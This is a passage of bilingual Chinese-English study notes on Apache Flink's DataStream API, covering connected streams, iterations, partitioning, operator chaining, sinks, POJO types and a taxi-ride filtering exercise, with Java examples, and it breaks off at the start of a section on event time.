<h4 id="Connect"><a href="#Connect" class="headerlink" title="Connect #"></a>Connect <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#connect">#</a></h4><h5 id="DataStream-DataStream-→-ConnectedStream"><a href="#DataStream-DataStream-→-ConnectedStream" class="headerlink" title="DataStream,DataStream → ConnectedStream #"></a>DataStream,DataStream → ConnectedStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastreamdatastream-rarr-connectedstream">#</a></h5><p>“Connects” two data streams retaining their types. Connect allowing for shared state between the two streams.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DataStream&lt;Integer&gt; someStream = <span class="comment">//...</span></span><br><span class="line">DataStream&lt;String&gt; otherStream = <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">ConnectedStreams&lt;Integer, String&gt; connectedStreams = someStream.connect(otherStream)</span><br></pre></td></tr></table></figure>

<p>“连接 “两个数据流，保留其类型。连接允许两个数据流之间共享状态。</p>
<h4 id="CoMap-CoFlatMap"><a href="#CoMap-CoFlatMap" class="headerlink" title="CoMap, CoFlatMap #"></a>CoMap, CoFlatMap <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#comap-coflatmap">#</a></h4><h5 id="ConnectedStream-→-DataStream"><a href="#ConnectedStream-→-DataStream" class="headerlink" title="ConnectedStream → DataStream #"></a>ConnectedStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#connectedstream-rarr-datastream">#</a></h5><p>Similar to map and flatMap on a connected data stream</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connectedStreams.map(<span class="keyword">new</span> CoMapFunction&lt;Integer, String, Boolean&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">map1</span><span class="params">(Integer value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">map2</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">connectedStreams.flatMap(<span class="keyword">new</span> CoFlatMapFunction&lt;Integer, String, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap1</span><span class="params">(Integer value, Collector&lt;String&gt; out)</span> </span>&#123;</span><br><span class="line">       out.collect(value.toString());</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap2</span><span class="params">(String value, Collector&lt;String&gt; out)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">for</span> (String word: value.split(<span class="string">&quot; &quot;</span>)) &#123;</span><br><span class="line">         out.collect(word);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>针对ConnectedStream的map和flatMap操作。</p>
<h4 id="Iterate"><a href="#Iterate" class="headerlink" title="Iterate #"></a>Iterate <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#iterate">#</a></h4><h5 id="DataStream-→-IterativeStream-→-ConnectedStream"><a href="#DataStream-→-IterativeStream-→-ConnectedStream" class="headerlink" title="DataStream → IterativeStream → ConnectedStream #"></a>DataStream → IterativeStream → ConnectedStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-iterativestream-rarr-connectedstream">#</a></h5><p>Creates a “feedback” loop in the flow, by redirecting the output of one operator to some previous operator. This is especially useful for defining algorithms that continuously update a model. The following code starts with a stream and applies the iteration body continuously. Elements that are greater than 0 are sent back to the feedback channel, and the rest of the elements are forwarded downstream.</p>
<p>基本概念：在流中创建“反馈（feedback）”循环，通过将一个算子的输出重定向到某个先前的算子。这对于定义不断更新模型的算法特别有用。</p>
<p>迭代的数据流向：DataStream → IterativeStream → DataStream</p>
<p>以下代码以流开始并连续应用迭代体。大于0的元素将被发送回反馈（feedback）通道，继续迭代，其余元素将向下游转发，离开迭代。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IterativeStream&lt;Long&gt; iteration = initialStream.iterate();</span><br><span class="line">DataStream&lt;Long&gt; iterationBody = iteration.map (<span class="comment">/*do something*/</span>);</span><br><span class="line">DataStream&lt;Long&gt; feedback = iterationBody.filter(<span class="keyword">new</span> FilterFunction&lt;Long&gt;()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Long value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 如果有符合feedback过滤条件的数据，比如：1，会持续不断的循环</span></span><br><span class="line">iteration.closeWith(feedback);</span><br><span class="line">DataStream&lt;Long&gt; output = iterationBody.filter(<span class="keyword">new</span> FilterFunction&lt;Long&gt;()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Long value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value &lt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="物理分区"><a href="#物理分区" class="headerlink" title="物理分区 #"></a>物理分区 <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#%E7%89%A9%E7%90%86%E5%88%86%E5%8C%BA">#</a></h3><p>Flink 也提供以下方法让用户根据需要在数据转换完成后对数据分区进行更细粒度的配置。</p>
<h4 id="Custom-Partitioning"><a href="#Custom-Partitioning" class="headerlink" title="Custom Partitioning #"></a>Custom Partitioning <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#custom-partitioning">#</a></h4><h5 id="DataStream-→-DataStream-4"><a href="#DataStream-→-DataStream-4" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-4">#</a></h5><p>Uses a user-defined Partitioner to select the target task for each element.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.partitionCustom(partitioner, <span class="string">&quot;someKey&quot;</span>);</span><br><span class="line">dataStream.partitionCustom(partitioner, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Random-Partitioning"><a href="#Random-Partitioning" class="headerlink" title="Random Partitioning #"></a>Random Partitioning <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#random-partitioning">#</a></h4><h5 id="DataStream-→-DataStream-5"><a href="#DataStream-→-DataStream-5" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-5">#</a></h5><p>Partitions elements randomly according to a uniform distribution.</p>
<p>根据均匀分布随机地划分元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.shuffle();</span><br></pre></td></tr></table></figure>

<h4 id="Rescaling"><a href="#Rescaling" class="headerlink" title="Rescaling #"></a>Rescaling <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#rescaling">#</a></h4><h5 id="DataStream-→-DataStream-6"><a href="#DataStream-→-DataStream-6" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-6">#</a></h5><p>Partitions elements, round-robin, to a subset of downstream operations. This is useful if you want to have pipelines where you, for example, fan out from each parallel instance of a source to a subset of several mappers to distribute load but don’t want the full rebalance that rebalance() would incur. This would require only local data transfers instead of transferring data over network, depending on other configuration values such as the number of slots of TaskManagers.</p>
<p>The subset of downstream operations to which the upstream operation sends elements depends on the degree of parallelism of both the upstream and downstream operation. For example, if the upstream operation has parallelism 2 and the downstream operation has parallelism 6, then one upstream operation would distribute elements to three downstream operations while the other upstream operation would distribute to the other three downstream operations. If, on the other hand, the downstream operation has parallelism 2 while the upstream operation has parallelism 6 then three upstream operations would distribute to one downstream operation while the other three upstream operations would distribute to the other downstream operation.</p>
<p>In cases where the different parallelisms are not multiples of each other one or several downstream operations will have a differing number of inputs from upstream operations.</p>
<p>Please see this figure for a visualization of the connection pattern in the above example:</p>
<p>将元素以轮回方式分配给下游操作的子集。如果你想拥有这样的管道，例如，你从一个源的每个并行实例扇出到几个映射器的子集，以分配负载，但不想要rebalance()会产生的完全再平衡，那么这很有用。这将只需要本地数据传输，而不是通过网络传输数据，这取决于其他配置值，如任务管理器的槽数。</p>
<p>上游操作发送元素的下游操作的子集取决于上游和下游操作的并行程度。例如，如果上游操作的平行度为2，而下游操作的平行度为6，那么一个上游操作将把元素分配给三个下游操作，而另一个上游操作将分配给其他三个下游操作。另一方面，如果下游操作有平行度2，而上游操作有平行度6，那么三个上游操作将分配给一个下游操作，而其他三个上游操作将分配给另一个下游操作。</p>
<p>在不同的平行度不是彼此的倍数的情况下，一个或几个下游操作将有来自上游操作的不同数量的输入。</p>
<p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.13/fig/rescale.svg" alt="Checkpoint barriers in data streams"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.rescale();</span><br></pre></td></tr></table></figure>

<h4 id="Broadcasting"><a href="#Broadcasting" class="headerlink" title="Broadcasting #"></a>Broadcasting <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#broadcasting">#</a></h4><h5 id="DataStream-→-DataStream-7"><a href="#DataStream-→-DataStream-7" class="headerlink" title="DataStream → DataStream #"></a>DataStream → DataStream <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#datastream-rarr-datastream-7">#</a></h5><p>Broadcasts elements to every partition.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataStream.broadcast();</span><br></pre></td></tr></table></figure>

<h3 id="算子链和资源组"><a href="#算子链和资源组" class="headerlink" title="算子链和资源组 #"></a>算子链和资源组 <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#%E7%AE%97%E5%AD%90%E9%93%BE%E5%92%8C%E8%B5%84%E6%BA%90%E7%BB%84">#</a></h3><p>将两个算子链接在一起能使得它们在同一个线程中执行，从而提升性能。Flink 默认会将能链接的算子尽可能地进行链接(例如， 两个 map 转换操作)。此外， Flink 还提供了对链接更细粒度控制的 API 以满足更多需求：</p>
<p>如果想对整个作业禁用算子链，可以调用 <code>StreamExecutionEnvironment.disableOperatorChaining()</code>。下列方法还提供了更细粒度的控制。需要注 意的是， 这些方法只能在 <code>DataStream</code> 转换操作后才能被调用，因为它们只对前一次数据转换生效。例如，可以 <code>someStream.map(...).startNewChain()</code> 这样调用，而不能 someStream.startNewChain()这样。</p>
<p>一个资源组对应着 Flink 中的一个 slot 槽，更多细节请看slots 槽。 你可以根据需要手动地将各个算子隔离到不同的 slot 中。</p>
<h4 id="Start-New-Chain"><a href="#Start-New-Chain" class="headerlink" title="Start New Chain #"></a>Start New Chain <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#start-new-chain">#</a></h4><p>Begin a new chain, starting with this operator. The two mappers will be chained, and filter will not be chained to the first mapper.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">someStream.filter(...).map(...).startNewChain().map(...);</span><br></pre></td></tr></table></figure>

<h4 id="Disable-Chaining"><a href="#Disable-Chaining" class="headerlink" title="Disable Chaining #"></a>Disable Chaining <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#disable-chaining">#</a></h4><p>Do not chain the map operator.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">someStream.map(...).disableChaining();</span><br></pre></td></tr></table></figure>

<h4 id="Set-Slot-Sharing-Group"><a href="#Set-Slot-Sharing-Group" class="headerlink" title="Set Slot Sharing Group #"></a>Set Slot Sharing Group <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/overview/#set-slot-sharing-group">#</a></h4><p>Set the slot sharing group of an operation. Flink will put operations with the same slot sharing group into the same slot while keeping operations that don’t have the slot sharing group in other slots. This can be used to isolate slots. The slot sharing group is inherited from input operations if all input operations are in the same slot sharing group. The name of the default slot sharing group is “default”, operations can explicitly be put into this group by calling slotSharingGroup(“default”).</p>
<p>设置一个操作的槽位共享组。Flink会把具有相同槽位共享组的操作放入同一个槽位，而把不具有槽位共享组的操作放在其他槽位。这可以用来隔离槽。如果所有的输入操作都在同一个槽共享组中，那么槽共享组就会从输入操作中继承下来。默认的槽共享组的名称是 “default”，操作可以通过调用slotSharingGroup(“default”)明确地放入这个组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">someStream.filter(...).slotSharingGroup(<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Data-Sinks"><a href="#Data-Sinks" class="headerlink" title="Data Sinks"></a>Data Sinks</h2><p>Flink针对DataStream提供了大量的已经实现的数据目的地（Sink），具体如下所示</p>
<ul>
<li><p>writeAsText()：将元素以字符串形式逐行写入，这些字符串通过调用每个元素的toString()方法来获取</p>
</li>
<li><p>writeAsCsv()：将元组以逗号分隔写入文件中，行及字段之间的分隔是可配置的，每个字段的值来自对象的toString()方法</p>
</li>
<li><p>print()/pringToErr()：打印每个元素的toString()方法的值到标准输出或者标准错误输出流中</p>
</li>
<li><p><code>writeToSocket</code> - Writes elements to a socket according to a <code>SerializationSchema</code></p>
</li>
<li><p><code>addSink</code> - Invokes a custom sink function. Flink comes bundled with connectors to other systems (such as Apache Kafka) that are implemented as sink functions. 调用一个自定义的sink函数。Flink捆绑了与其他系统（如Apache Kafka）的连接器，这些连接器被实现为sink函数。</p>
<p>Flink提供了一批内置的Connector，其中有的Connector会提供对应的Sink支持</p>
<h2 id="Iterations"><a href="#Iterations" class="headerlink" title="Iterations"></a>Iterations</h2><p>之前提到过相关的算子，这是一个比较重要的概念，举个例子来进一步了解。</p>
<p>For example, here is program that continuously subtracts 1 from a series of integers until they reach zero:</p>
<p>例如，这里有一个程序，从一系列的整数中连续减去1，直到达到0。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IterationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    DataStreamSource&lt;Long&gt; longDataStreamSource = env.generateSequence(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// define an IterativeStream</span></span><br><span class="line">    IterativeStream&lt;Long&gt; iterate = longDataStreamSource.iterate();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// minus 1</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Long&gt; map = iterate.map(<span class="keyword">new</span> MapFunction&lt;Long, Long&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Long <span class="title">map</span><span class="params">(Long aLong)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aLong - <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// filter</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Long&gt; filter = map.filter(<span class="keyword">new</span> FilterFunction&lt;Long&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Long aLong)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aLong &gt; <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// To close an iteration and define the iteration tail, call the closeWith(feedbackStream) method of the IterativeStream.</span></span><br><span class="line">    <span class="comment">// The DataStream given to the closeWith function will be fed back to the iteration head.</span></span><br><span class="line">    <span class="comment">// A common pattern is to use a filter to separate the part of the stream that is fed back, and the part of the stream which is propagated forward.</span></span><br><span class="line">    iterate.closeWith(filter);</span><br><span class="line">    SingleOutputStreamOperator&lt;Long&gt; filter1 = map.filter(<span class="keyword">new</span> FilterFunction&lt;Long&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Long aLong)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aLong &lt;= <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    filter1.print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们对数据流map进行了分流，大于0的不断重复减一，否则则输出。</p>
</li>
</ul>
<h2 id="案例三：Filtering-a-Stream-Ride-Cleansing"><a href="#案例三：Filtering-a-Stream-Ride-Cleansing" class="headerlink" title="案例三：Filtering a Stream (Ride Cleansing)"></a>案例三：Filtering a Stream (Ride Cleansing)</h2><h3 id="什么能被转化成流？"><a href="#什么能被转化成流？" class="headerlink" title="什么能被转化成流？"></a>什么能被转化成流？</h3><p>Flink 的 Java 和 Scala DataStream API 可以将任何可序列化的对象转化为流。Flink 自带的序列化器有</p>
<ul>
<li>基本类型，即 String、Long、Integer、Boolean、Array</li>
<li>复合类型：Tuples、POJOs 和 Scala case classes</li>
</ul>
<p>而且 Flink 会交给 Kryo 序列化其他类型。也可以将其他序列化器和 Flink 一起使用。特别是有良好支持的 Avro。</p>
<p>对于 Java，Flink 自带有 <code>Tuple0</code> 到 <code>Tuple25</code> 类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tuple2&lt;String, Integer&gt; person = Tuple2.of(<span class="string">&quot;Fred&quot;</span>, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// zero based index!  </span></span><br><span class="line">String name = person.f0;</span><br><span class="line">Integer age = person.f1;</span><br></pre></td></tr></table></figure>

<p>如果满足以下条件，Flink 将数据类型识别为 POJO 类型（并允许“按名称”字段引用）：</p>
<ul>
<li>该类是公有且独立的（没有非静态内部类）</li>
<li>该类有公有的无参构造函数</li>
<li>类（及父类）中所有的所有不被 static、transient 修饰的属性要么是公有的（且不被 final 修饰），要么是包含公有的 getter 和 setter 方法，这些方法遵循 Java bean 命名规范。</li>
</ul>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Integer age;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;&#125;;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Integer age)</span> </span>&#123;  </span><br><span class="line">        . . .</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">&quot;Fred Flintstone&quot;</span>, <span class="number">35</span>);</span><br></pre></td></tr></table></figure>

<p>这里其实对于我们类的要求比较高，不能满足序列化的要求的自定义类，必然会引起错误，需要注意。</p>
<h3 id="Stream-执行环境"><a href="#Stream-执行环境" class="headerlink" title="Stream 执行环境"></a>Stream 执行环境</h3><p>每个 Flink 应用都需要有执行环境，在该示例中为 <code>env</code>。流式应用需要用到 <code>StreamExecutionEnvironment</code>。</p>
<p>DataStream API 将你的应用构建为一个 job graph，并附加到 <code>StreamExecutionEnvironment</code> 。当调用 <code>env.execute()</code> 时此 graph 就被打包并发送到 JobManager 上，后者对作业并行处理并将其子任务分发给 Task Manager 来执行。每个作业的并行子任务将在 <em>task slot</em> 中执行。</p>
<p>注意，如果没有调用 execute()，应用就不会运行。</p>
<p>此分布式运行时取决于你的应用是否是可序列化的。它还要求所有依赖对集群中的每个节点均可用。</p>
<h3 id="一个例子：过滤后只包含成年人"><a href="#一个例子：过滤后只包含成年人" class="headerlink" title="一个例子：过滤后只包含成年人"></a>一个例子：过滤后只包含成年人</h3><p>这里例子主要是为了体现pojo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">filter_people</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        List&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="keyword">new</span> Person(<span class="string">&quot;xiaoyuyu&quot;</span>,<span class="number">22</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Person(<span class="string">&quot;louwin&quot;</span>,<span class="number">23</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Person(<span class="string">&quot;kid&quot;</span>,<span class="number">3</span>));</span><br><span class="line">        DataStreamSource&lt;Person&gt; personDataStreamSource = env.fromCollection(list);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Person&gt; filter = personDataStreamSource.filter(<span class="keyword">new</span> FilterFunction&lt;Person&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Person person)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> person.age &gt;= <span class="number">18</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        filter.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String name;</span><br><span class="line">        <span class="keyword">public</span> Integer age;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Integer age)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.name.toString() + <span class="string">&quot;: age &quot;</span> + <span class="keyword">this</span>.age.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2&gt; xiaoyuyu: age 22</span></span><br><span class="line"><span class="comment">// 3&gt; louwin: age 23</span></span><br></pre></td></tr></table></figure>

<h3 id="Ride-Cleansing"><a href="#Ride-Cleansing" class="headerlink" title="Ride Cleansing"></a>Ride Cleansing</h3><p>The task of the “Taxi Ride Cleansing” exercise is to cleanse a stream of TaxiRide events by removing events that start or end outside of New York City.</p>
<p>The <code>GeoUtils</code> utility class provides a static method <code>isInNYC(float lon, float lat)</code> to check if a location is within the NYC area.</p>
<p><a href="https://www.jianshu.com/p/50561a8322f7">https://www.jianshu.com/p/50561a8322f7</a></p>
<p>其实关键就是一个isNYC，具体数据已经下载不下来了，但是结合别人之前的博文其实可以了解到只是个简单的fliter。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RideCleansingExercise</span> <span class="keyword">extends</span> <span class="title">ExerciseBase</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    ParameterTool params = ParameterTool.fromArgs(args);</span><br><span class="line">    <span class="keyword">final</span> String input = params.get(<span class="string">&quot;input&quot;</span>, ExerciseBase.pathToRideData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> maxEventDelay = <span class="number">60</span>;       <span class="comment">// events are out of order by max 60 seconds</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> servingSpeedFactor = <span class="number">600</span>; <span class="comment">// events of 10 minutes are served in 1 second</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// set up streaming execution environment</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(ExerciseBase.parallelism);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start the data generator</span></span><br><span class="line">    DataStream&lt;TaxiRide&gt; rides = env.addSource(rideSourceOrTest(<span class="keyword">new</span> TaxiRideSource(input, maxEventDelay, servingSpeedFactor)));</span><br><span class="line"></span><br><span class="line">    DataStream&lt;TaxiRide&gt; filteredRides = rides</span><br><span class="line">      <span class="comment">// filter out rides that do not start or stop in NYC</span></span><br><span class="line">      .filter(<span class="keyword">new</span> NYCFilter());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// print the filtered stream</span></span><br><span class="line">    printOrTest(filteredRides);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the cleansing pipeline</span></span><br><span class="line">    env.execute(<span class="string">&quot;Taxi Ride Cleansing&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">NYCFilter</span> <span class="keyword">implements</span> <span class="title">FilterFunction</span>&lt;<span class="title">TaxiRide</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(TaxiRide taxiRide)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> GeoUtils.isInNYC(taxiRide.startLon, taxiRide.startLat) &amp;&amp;</span><br><span class="line">        GeoUtils.isInNYC(taxiRide.endLon, taxiRide.endLat);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="流式分析"><a href="#流式分析" class="headerlink" title="流式分析"></a>流式分析</h2><h3 id="Event-Time-and-Watermarks"><a href="#Event-Time-and-Watermarks" class="headerlink" title="Event Time and Watermarks"></a>Event Time and Watermarks</h3><h4 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h4><p>Flink 明确支持以下三种时间语义:</p>
<ul>
<li><em>事件时间(event time)：</em> 事件产生的时间，记录的是设备生产(或者存储)事件的时间</li>
<li><em>摄取时间(ingestion time)：</em> Flink 读取事件时记录的时间</li>
<li><em>处理时间(processing time)：</em> Flink pipeline 中具体算子处理事件的时间</li>
</ul>
<p>为了获得可重现的结果，例如在计算过去的特定一天里第一个小时股票的最高价格时，我们应该使用事件时间。这样的话，无论什么时间去计算都不会影响输出结果。然而如果使用处理时间的话，实时应用程序的结果是由程序运行的时间所决定。多次运行基于处理时间的实时程序，可能得到的结果都不相同，也可能会导致再次分析历史数据或者测试新代码变得异常困难。</p>
<p>在流处理中，主要有两个时间概念 </p>
<ul>
<li>事件时间，即事件实际发生的时间。更准确地说，每一个事件都有一个与它相关的时间戳，并且时间戳是数据记录的一部分（比如手机或者服务器的记录）。事件时间其实就是时间戳。</li>
